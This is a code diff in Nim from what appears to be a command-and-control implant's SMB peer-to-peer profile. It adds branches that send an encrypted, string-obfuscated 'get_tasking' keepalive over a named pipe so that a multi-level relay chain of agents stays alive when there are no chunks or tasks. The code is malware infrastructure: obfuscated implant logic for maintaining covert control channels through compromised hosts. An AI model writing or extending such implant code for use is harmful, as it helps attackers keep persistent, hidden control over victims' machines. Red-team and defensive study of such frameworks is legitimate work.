@@ -725,6 +725,15 @@ proc start*(profile: SmbProfile) =
                   debug "[DEBUG] SMB P2P: Sending ", noChunkDelegates.len, " downstream delegate(s) (no chunks)"
                 let responseEncrypted = profile.encryptMessage($delegateResponse, profile.callbackUuid)
                 discard sendChunkedMessage(profile.pipeHandle, responseEncrypted)
+              else:
+                # Always respond to keep the relay chain alive (multi-level P2P)
+                let getTaskingMsg = %* {
+                  obf("action"): obf("get_tasking"),
+                  obf("tasking_size"): -1
+                }
+                debug "[DEBUG] SMB P2P: Sending get_tasking keepalive (no chunks, no downstream data)"
+                let responseEncrypted = profile.encryptMessage($getTaskingMsg, profile.callbackUuid)
+                discard sendChunkedMessage(profile.pipeHandle, responseEncrypted)
               continue
             
             # Check for action field
@@ -923,6 +932,15 @@ proc start*(profile: SmbProfile) =
                       delegateResponse[obf("delegates")] = noTaskDelegates
                       debug "[DEBUG] SMB P2P: Sending ", noTaskDelegates.len, " downstream delegate(s) (no tasks)"
                     let responseEncrypted = profile.encryptMessage($delegateResponse, profile.callbackUuid)
+                    discard sendChunkedMessage(profile.pipeHandle, responseEncrypted)
+                  else:
+                    # Always respond to keep the relay chain alive (multi-level P2P)
+                    let getTaskingMsg = %* {
+                      obf("action"): obf("get_tasking"),
+                      obf("tasking_size"): -1
+                    }
+                    debug "[DEBUG] SMB P2P: Sending get_tasking keepalive (no tasks, no downstream data)"
+                    let responseEncrypted = profile.encryptMessage($getTaskingMsg, profile.callbackUuid)
                     discard sendChunkedMessage(profile.pipeHandle, responseEncrypted)
                   continue
           except:
